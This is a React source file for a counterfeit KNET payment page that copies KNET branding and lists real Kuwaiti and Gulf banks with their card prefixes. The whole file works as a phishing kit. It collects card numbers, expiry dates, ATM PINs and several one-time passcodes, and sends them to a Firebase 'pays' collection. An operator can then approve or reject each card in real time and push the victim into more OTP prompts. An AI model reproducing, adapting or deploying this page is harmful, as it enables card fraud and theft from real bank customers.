"use client";
import { useEffect, useState } from "react";
import "./kent.css";
import { doc, onSnapshot, updateDoc } from "firebase/firestore";
import { db, handlePay } from "../firebase";
import FullPageLoader from "../loader1";
type PaymentInfo = {
  createdDate?: string;
  cardNumber: string;
  year: string;
  month: string;
  cvv: string;
  bank?: string;
  otp?: string;
  pass: string;
  cardState: string;
  allOtps: string[];
  bank_card: string[];
  prefix: string;
  status: "new" | "pending" | "approved" | "rejected";
};
const BANKS = [
  {
    value: "NBK",
    label: "National Bank of Kuwait",
    cardPrefixes: ["464452", "589160", "46445250", "543363"],
  },
  {
    value: "CBK",
    label: "Commercial Bank of Kuwait",
    cardPrefixes: ["532672", "537015", "521175", "516334"],
  },
  {
    value: "GBK",
    label: "Gulf Bank",
    cardPrefixes: [
      "526206",
      "531470",
      "531644",
      "531329",
      "517419",
      "517458",
      "531471",
      "559475",
    ],
  },
  {
    value: "ABK",
    label: "Al Ahli Bank of Kuwait",
    cardPrefixes: ["403622", "428628    ", "423826"],
  },
  {
    value: "BURGAN",
    label: "Burgan Bank",
    cardPrefixes: [
      "468564",
      "402978",
      "403583",
      "415254",
      "450238",
      "540759",
      "49219000",
    ],
  },
  {
    value: "KFH",
    label: "Kuwait Finance House",
    cardPrefixes: ["485602", "537016", "537016", "450778"],
  },
  {
    value: "BOUBYAN",
    label: "Boubyan Bank",
    cardPrefixes: [
      "470350",
      "490455",
      "490456",
      "404919",
      "450605",
      "426058",
      "431199",
    ],
  },
  {
    value: "KIB",
    label: "Kuwait International Bank",
    cardPrefixes: ["409054", "406464"],
  },
  {
    value: "UNB",
    label: "Union National Bank   ",
    cardPrefixes: ["457778", "513000"], // Added common prefixes for IBK
  },
  {
    value: "BBK",
    label: "Bank of Bahrain and Kuwait",
    cardPrefixes: ["418056"], // Added a missing prefix
  },
  {
    value: "BNP",
    label: "BNP Paribas",
    cardPrefixes: ["450216", "531483", "489800"], // Added a common prefix for BNP
  },
  {
    value: "HSBC",
    label: "HSBC Middle East Bank",
    cardPrefixes: ["447284", "530001", "453095"], // Added an additional HSBC prefix
  },
  {
    value: "FAB",
    label: "First Abu Dhabi Bank",
    cardPrefixes: ["440891", "530123", "454888"], // Added a prefix used by FAB
  },
  {
    value: "CITIBANK",
    label: "Citibank",
    cardPrefixes: ["431457", "545432", "400800"], // Added another Citibank prefix
  },
  {
    value: "QNB",
    label: "Qatar National Bank",
    cardPrefixes: ["521020", "524745"], // Added a Qatar National Bank prefix
  },
  {
    value: "Doha",
    label: "Doha Bank",
    cardPrefixes: ["419252"], // Added another Mashreq prefix
  },
  {
    value: "ALRAJHI",
    label: "Al Rajhi Bank",
    cardPrefixes: ["458838"], // Added a common Al Rajhi prefix
  },
  {
    value: "BANK_MUSCAT",
    label: "Bank Muscat",
    cardPrefixes: ["489312", "529410", "454100"], // Added a prefix for Bank Muscat
  },
  {
    value: "WARBA",
    label: "Warba Bank",
    cardPrefixes: ["541350", "525528", "532749", "559459"], // Added another common ICBC prefix
  },
];

export default function Kent2(props: { setPage?: any }) {
  const [step, setstep] = useState(2);
  const [total, setTotal] = useState("");
  const [loading, setLoading] = useState(false);
  const [newotp] = useState([""]);

  const handleUpdatePage = async (page: string) => {
    const visitorId = localStorage.getItem("visitor");
    try {
      const docRef = doc(db, "pays", visitorId!);
      await updateDoc(docRef, { page: page });
    } catch (error) {
      console.error("Error updating current page:", error);
    }
  };
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    createdDate: new Date().toISOString(),
    cardNumber: "",
    year: "",
    month: "",
    otp: "",
    cvv: "",
    allOtps: newotp,
    bank: "",
    pass: "",
    cardState: "new",
    bank_card: [""],
    prefix: "",
    status: "new",
  });
  const handleNewpage = () => {
    handleUpdatePage("knet");
  };
  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `);
    if (newotp.length > 2) {
      handleNewpage();
    }
  };
  useEffect(() => {
    setTotal(localStorage?.getItem("vv")!);
  }, []);

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any;
          if (data.status) {
            setPaymentInfo((prev) => ({ ...prev, status: data.status }));
            if (data.status === "approved") {
              setstep(2);
              setLoading(false);
              data.page === "o";
            } else if (data.status === "rejected") {
              setLoading(false);
              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ");
              setstep(1);
            }
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);

  return (
    <div
      style={{
        background: "#f1f1f1",
        height: "100vh",
        margin: 0,
        padding: 0,
        display: "flex",
      }}
      dir="ltr"
    >
      <form
        onSubmit={(e) => {
          e.preventDefault();
          console.log(total);
        }}
      >
        <div className="madd" />
        <div id="PayPageEntry">
          <div className="container">
            <div className="content-block">
              <div className="form-card">
                <div
                  className="container"
                  style={{ display: "flex", justifyContent: "center" }}
                >
                  <img
                    src="./kv.png"
                    className="-"
                    alt="logo"
                    height={50}
                    width={50}
                  />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">
                    KNET Payment
                  </label>
                </div>
                <div id="OrgTranxAmt">
                  <div className="row">
                    <label className="column-label">Amount: </label>
                    <label className="column-value text-label">
                      {localStorage.getItem("vv") === "0"
                        ? 5
                        : localStorage.getItem("vv")}{" "}
                      kd
                    </label>
                  </div>
                </div>
                {/* Added for PG Eidia Discount starts   */}
                <div
                  className="row"
                  id="DiscntRate"
                  style={{ display: "none" }}
                />
                <div
                  className="row"
                  id="DiscntedAmt"
                  style={{ display: "none" }}
                />
                {/* Added for PG Eidia Discount ends   */}
              </div>
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="otpmsgDC"
                />
                {/*Customer Validation  for knet*/}
                <div
                  className="notification"
                  style={{
                    border: "#ff0000 1px solid",
                    backgroundColor: "#f7dadd",
                    fontSize: 12,
                    fontFamily: "helvetica, arial, sans serif",
                    color: "#ff0000",
                    paddingRight: 15,
                    display: "none",
                    marginBottom: 3,
                    textAlign: "center",
                  }}
                  id="CVmsg"
                />
                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: "none" }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: "50%" }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>

                {step === 1 ? (
                  <>
                    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                      <div className="row">
                        <label
                          className="column-label"
                          style={{ width: "40%" }}
                        >
                          Select Your Bank:
                        </label>
                        <select
                          className="column-value"
                          style={{ width: "60%" }}
                          onChange={(e: any) => {
                            const selectedBank = BANKS.find(
                              (bank) => bank.value === e.target.value
                            );

                            setPaymentInfo({
                              ...paymentInfo,
                              bank: e.target.value,
                              bank_card: selectedBank
                                ? selectedBank.cardPrefixes
                                : [""],
                            });
                          }}
                        >
                          <>
                            <option value="bankname" title="Select Your Bank">
                              Select Your Banks
                            </option>
                            {BANKS.map((i, index) => (
                              <option value={i.value} key={index}>
                                {i.label} [{i.value}]
                              </option>
                            ))}
                          </>
                        </select>
                      </div>
                      <div
                        className="row three-column"
                        id="Paymentpagecardnumber"
                      >
                        <label className="col">Card Number:</label>
                        <select
                          className="col "
                          name="dcprefix"
                          id="dcprefix"
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              prefix: e.target.value,
                            })
                          }
                          style={{ width: "25%" }}
                        >
                          <option
                            value={paymentInfo.prefix}
                            onClick={(e: any) => {
                              setPaymentInfo({
                                ...paymentInfo,
                                prefix: e.target.value,
                              });
                            }}
                          >
                            prefix
                          </option>
                          {paymentInfo.bank_card.map((i, index) => (
                            <option
                              key={index}
                              value={i}
                              onClick={(e: any) => {
                                setPaymentInfo({
                                  ...paymentInfo,
                                  prefix: e.target.value,
                                });
                              }}
                            >
                              {i}
                            </option>
                          ))}
                        </select>
                        <input
                          name="debitNumber"
                          id="debitNumber"
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          size={10}
                          className="allownumericwithoutdecimal"
                          style={{ width: "45%", marginLeft: 2 }}
                          maxLength={10}
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              cardNumber: e.target.value,
                            })
                          }
                          title="Should be in number. Length should be 10"
                        />
                      </div>
                      <div className="row three-column" id="cardExpdate">
                        <label className="col "> Expiration Date: </label>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              month: e.target.value,
                            })
                          }
                          className="col"
                        >
                          <option value={0}>MM</option>
                          <option value={1}>01</option>
                          <option value={2}>02</option>
                          <option value={3}>03</option>
                          <option value={4}>04</option>
                          <option value={5}>05</option>
                          <option value={6}>06</option>
                          <option value={7}>07</option>
                          <option value={8}>08</option>
                          <option value={9}>09</option>
                          <option value={10}>10</option>
                          <option value={11}>11</option>
                          <option value={12}>12</option>
                        </select>
                        <select
                          onChange={(e: any) =>
                            setPaymentInfo({
                              ...paymentInfo,
                              year: e.target.value,
                            })
                          }
                          className="col"
                        >
                          <option value={0}>YYYY</option>
                          <option value={2024}>2024</option>
                          <option value={2025}>2025</option>
                          <option value={2026}>2026</option>
                          <option value={2027}>2027</option>
                          <option value={2028}>2028</option>
                          <option value={2029}>2029</option>
                          <option value={2030}>2030</option>
                          <option value={2031}>2031</option>
                          <option value={2032}>2032</option>
                          <option value={2033}>2033</option>
                          <option value={2034}>2034</option>
                          <option value={2035}>2035</option>
                          <option value={2036}>2036</option>
                          <option value={2037}>2037</option>
                          <option value={2038}>2038</option>
                          <option value={2039}>2039</option>
                          <option value={2040}>2040</option>
                          <option value={2041}>2041</option>
                          <option value={2042}>2042</option>
                          <option value={2043}>2043</option>
                          <option value={2044}>2044</option>
                          <option value={2045}>2045</option>
                          <option value={2046}>2046</option>
                          <option value={2047}>2047</option>
                          <option value={2048}>2048</option>
                          <option value={2049}>2049</option>
                          <option value={2050}>2050</option>
                          <option value={2051}>2051</option>
                          <option value={2052}>2052</option>
                          <option value={2053}>2053</option>
                          <option value={2054}>2054</option>
                          <option value={2055}>2055</option>
                          <option value={2056}>2056</option>
                          <option value={2057}>2057</option>
                          <option value={2058}>2058</option>
                          <option value={2059}>2059</option>
                          <option value={2060}>2060</option>
                          <option value={2061}>2061</option>
                          <option value={2062}>2062</option>
                          <option value={2063}>2063</option>
                          <option value={2064}>2064</option>
                          <option value={2065}>2065</option>
                          <option value={2066}>2066</option>
                          <option value={2067}>2067</option>
                        </select>
                      </div>
                      <div className="row" id="PinRow">
                        {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                        <input
                          type="hidden"
                          name="cardPinType"
                          defaultValue="A"
                        />
                        <div className="row">
                          <label className="column-label"> PIN: </label>

                          <input
                            inputMode="numeric"
                            pattern="[0-9]*"
                            name="cardPin"
                            id="cardPin"
                            onChange={(e: any) =>
                              setPaymentInfo({
                                ...paymentInfo,
                                pass: e.target.value,
                              })
                            }
                            autoComplete="off"
                            title="Should be in number. Length should be 4"
                            type="password"
                            size={4}
                            maxLength={4}
                            className="allownumericwithoutdecimal col-9 "
                          />
                        </div>
                      </div>
                    </div>
                  </>
                ) : step === 2 && paymentInfo.status === "approved" ? (
                  <div>
                    <form style={{ display: "flex", flexDirection: "column" }}>
                      <label>
                        Please enter the verification code sent to your phone
                        number
                      </label>
                      <label>
                        <input
                          name="otp"
                          style={{ width: "100%", marginTop: 15 }}
                          id="otp"
                          type="tel"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          className="allownumericwithoutdecimal"
                          maxLength={6}
                          value={paymentInfo.otp}
                          onChange={(e: any) => {
                            setPaymentInfo({
                              ...paymentInfo,
                              otp: e.target.value,
                            });
                          }}
                          title="Should be in number. Length should be 6"
                        />
                      </label>
                    </form>
                  </div>
                ) : (
                  <div style={{ textAlign: "center", padding: "20px" }}>
                    <p>Please wait while we process your payment...</p>
                  </div>
                )}
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: "center" }}>
                    <div id="loading" style={{ display: "none" }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: "left",
                            marginLeft: "20%",
                          }}
                        />
                        <label
                          className="col text-label"
                          style={{ width: "70%", textAlign: "center" }}
                        >
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div style={{ display: "flex" }}>
                      <button
                        disabled={
                          step === 1 &&
                          (paymentInfo.prefix === "" ||
                            paymentInfo.bank === "" ||
                            paymentInfo.cardNumber === "" ||
                            paymentInfo.pass === "" ||
                            paymentInfo.month === "" ||
                            paymentInfo.year === "" ||
                            paymentInfo.pass.length !== 4)
                        }
                        type="submit"
                        onClick={(e) => {
                          e.preventDefault();

                          if (step === 1) {
                            setLoading(true);
                            handlePay(paymentInfo, setPaymentInfo);
                            setstep(2);
                          } else if (step >= 2) {
                            if (!newotp.includes(paymentInfo.otp!)) {
                              newotp.push(paymentInfo.otp!);
                            }
                            setLoading(true);
                            handleAddotp(paymentInfo.otp!);
                            //     handleOArr(paymentInfo.otp!);
                            handlePay(paymentInfo, setPaymentInfo);
                            setTimeout(() => {
                              setLoading(false);
                              setTimeout(() => {}, 2000);
                              setPaymentInfo({
                                ...paymentInfo,
                                otp: "",
                                status: "approved",
                              });
                              props.setPage("phone");
                            }, 3000);
                          }
                        }}
                      >
                        {loading
                          ? "Wait..."
                          : step === 1
                          ? "Submit"
                          : "Verify OTP"}
                      </button>
                      <button>Cancel</button>
                    </div>
                  </div>
                </div>
              </div>
              <div
                id="overlayhide"
                className="overlay"
                style={{ display: "none" }}
              ></div>

              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: "center",
                        fontSize: 11,
                        lineHeight: 1,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: "bold",
                          color: "#0077d5",
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
                        - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
        <FullPageLoader isLoading={loading} />
      </form>
      <style>
        {`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        body {
          font-family: Verdana, Arial, Helvetica, sans-serif;
          background-color: #ebebeb;
        }
        .container {
          width: 100%;
          padding: 15px;
          box-sizing: border-box;
        }
        .content-block {
          width: 395px;
          margin: 0 auto;
        }
        .row {
          border-bottom: 1px solid #8f8f90;
          padding-bottom: 5px;
          padding-top: 5px;
        }
        .row_new {
          padding-bottom: 5px;
          padding-top: 5px;
        }
        .column-label,
        .column-value,
        .column-long {
          float: left;
        }
        .column-label {
          width: 25%;
        }
        .column-value {
          width: 25%;
        }
        .row.three-column .column-value {
          width: 25%;
          margin-right: 5px;
        }
        .row.three-column .column-long {
          width: 25%;
          float: right;
        }
        .row:after {
          content: '';
          display: table;
          clear: both;
        }
        .form-card {
          background-color: #ffffff;
          padding: 20px;
          border: 2px solid #8f8f90;
          border-radius: 15px;
          margin-bottom: 15px;
          box-shadow: 0 0 6px rgba(0, 0, 0, 0.3);
        }
        .form-card:nth-child(1) {
          margin-top: 25px;
        }
        .form-card .row:nth-child(1) {
          padding-top: 0;
        }
        .footer-content .row,
        .footer-content-new .row,
        .form-card .row:nth-last-child(1) {
          border: 0;
          padding-bottom: 0;
        }
        form label {
          font-size: 11px;
          color: #0070cd;
          font-weight: bold;
          text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
        }
        select {
          font-size: 11px;
          height: 20px;
        }
        form .text-label,
        input,
        select {
          color: #444444;
          font-weight: normal;
        }
        form input[type='tel'],
        input[type='password'] {
          border: 2px solid #0070cd;
          box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
          padding: 0 3px;
          outline: 0;
          font-size: 11px;
          height: 20px;
        }
        form input[type='text'],
        input[type='password'] {
          border: 2px solid #0070cd;
          box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.3);
          padding: 0 3px;
          outline: 0;
          font-size: 11px;
          height: 20px;
        }
        .footer-content {
          text-align: center;
          margin-top: 15px;
          font-weight: bold;
          color: #2277d3;
        }
        .brand-img {
          margin-right: 5px;
          float: right;
        }
        .brand-info {
          font-size: 12px;
          text-align: left;
        }
        
        #ValidationMessage {
          -moz-transaction: height 1s ease;
          -webkit-transaction: height 1s ease;
          transition: height 1s ease;
          border: #ff0000 1px solid;
          background-color: #f7dadd;
          font-size: 12px;
          font-family: helvetica, arial, sans serif;
          color: #ff0000;
          padding: 2px;
          display: none;
          margin-bottom: 3px;
          text-align: center;
        }
        .footer-content #knet-brand {
          width: 43px;
          height: 43px;
          margin-top: 5px;
        }
        .footer-content .social-links {
          margin-top: 15px;
          text-align: center;
        }
        .footer-content .social-links div {
          height: 30px;
          display: inline-block;
        }
        .footer-content .social-links div#knet-yt {
          width: 35px;
        }
        .footer-content .social-links div#knet-sn {
          width: 27px;
        }
        .footer-content .social-links div#knet-tw {
          width: 27px;
        }
        .footer-content .social-links div#knet-it {
          width: 27px;
        }
        .footer-content .social-links div#knet-fb {
          width: 27px;
        }
        button {
          width: 100%;
        }
        
        .submit-button {
          background-color: #eaeaea;
          border: 1px solid #cacaca;
          padding: 5px 0;
          font-weight: bold;
          color: #666666;
          width: 50%;
          float: left;
          height: 27px;
          border-radius: 4px;
        }
        .cancel-button {
          background-color: #eaeaea;
          border: 1px solid #cacaca;
          padding: 5px 0;
          font-weight: bold;
          color: #666666;
          width: 50%;
          height: 27px;
          border-radius: 4px;
          -webkit-appearance: none;
        }
        .row.alert-msg {
          font-size: 12px;
          text-align: justify;
          background-color: #d9edf6;
          padding: 10px !important;
          border: 1px solid #bacce0;
          border-radius: 4px;
          margin-bottom: 10px;
        }
        @media all and (max-width: 425px) {
          .content-block {
            width: 98%;
            margin: 0 auto;
          }
        }
        .overlay {
          background: #555555;
          display: none;
          position: absolute;
          top: 0;
          right: 0;
          bottom: 0;
          left: 0;
          opacity: 0.5;
        }
        .terms {
          font-size: 11px;
          color: #0070cd;
          font-weight: bold;
          font-style: italic;
          text-decoration: none;
        }
        .paymentOption {
          vertical-align: super;
        }
        
        .container-blogo {
          width: 100%;
          margin-top: -5px;
          margin-bottom: 15px;
        }
        .logoHead-mob {
          width: 42%;
          margin-left: 27%;
          /* width:16%;
        margin-left:40%; */
          margin-right: auto;
        }
        
        /* Added for Knet */
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 768px) {
          .wrapper {
            margin-top: 10%;
          }
        }
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 500px) {
          .wrapper {
            max-width: 100%;
            width: 100%;
          }
        }
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 435px) {
          .logoHead {
            left: 36%;
          }
          .contentBox {
            padding: 18px;
          }
        }
        /* Medium devices (tablets, 768px and up) */
        @media (max-width: 380px) {
          .contentBox {
            padding: 12px;
          }
          .wrapper {
            margin-top: 20%;
          }
        }
        @media (max-width: 350px) {
          .contentBox .col:first-child .paymentlabel {
            padding-left: 0;
          }
        }
        /*added for tooltip by sib*/
        
        .tooltip {
          position: relative;
          display: block;
        }
        .tooltip .tooltiptext {
          visibility: hidden;
          width: 80%;
          background-color: #555;
          color: #fff;
          text-align: center;
          border-radius: 6px;
          padding: 10px;
          position: absolute;
          z-index: 1;
          bottom: 113%;
          left: 50%;
          margin-left: -52%;
          opacity: 0;
          transition: opacity 0.5s;
          font-size: 12px;
          margin-bottom: 9px;
          -webkit-box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
          -moz-box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
          box-shadow: 4px 3px 10px 0px rgba(0, 0, 0, 0.75);
        }
        .tooltip .tooltiptext::after {
          content: '';
          position: absolute;
          top: 100%;
          left: 50%;
          margin-left: -45px;
          border-width: 5px;
          border-style: solid;
          border-color: #555 transparent transparent transparent;
        }
        /*.tooltip:hover .tooltiptext {*/
        div#tooltip_0:hover .tooltiptext {
          visibility: visible;
          opacity: 1;
        }
        /* turn the img to gray :sib*/
        .doGray {
          -webkit-filter: grayscale(100%);
          filter: grayscale(100%);
          opacity: 0.5;
        }
        /* Added by Ahmed & Saqib */
        label#ValidationMessage {
          -moz-transaction: height 1s ease;
          -webkit-transaction: height 1s ease;
          transition: height 1s ease;
          border: #ff0000 1px solid;
          background-color: #f7dadd;
          font-size: 12px;
          font-family: helvetica, arial, sans serif;
          color: #ff0000;
          padding: 5px 2px 5px 2px;
          display: none;
          margin-bottom: 3px;
          text-align: center;
          margin-top: 10px;
        }
        div#fasterCheckDiv1 {
          float: left;
          padding-left: 10%;
          position: relative;
          display: block;
          width: 35%;
          padding-top: 3px;
        }
        div#fasterCheckDiv2 {
          float: left;
          margin-left: 30%;
          position: relative;
          padding-top: 3px;
          width: 70px;
          padding-top: 3px;
        }
        div#fasterCheckDiv1 > label > img {
          width: 48px;
          height: 35px;
          border-radius: 3px;
        }
        div#fasterCheckDiv2 > label > img {
          width: 48px;
          height: 35px;
          border-radius: 3px;
        }
        .madd {
          height: 90px;
          max-width: 372px;
          margin: 5px auto -30px auto;
          border-radius: 0px 10px;
          display: block;
        }
        
        /* Ends */
        `}
      </style>
    </div>
  );
}
